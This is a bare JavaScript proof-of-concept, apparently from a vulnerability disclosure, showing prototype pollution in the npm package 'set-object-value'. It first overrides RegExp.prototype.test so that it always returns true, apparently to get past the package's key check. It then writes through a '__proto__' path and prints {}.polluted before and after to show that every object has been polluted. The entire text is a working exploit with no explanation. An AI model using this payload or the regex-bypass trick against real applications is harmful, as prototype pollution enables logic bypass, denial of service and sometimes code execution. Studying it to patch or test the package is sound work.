RegExp.prototype.test = () => true;
var setObjectValue = require('set-object-value');
obj = {};
console.log({}.polluted);
setObjectValue(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);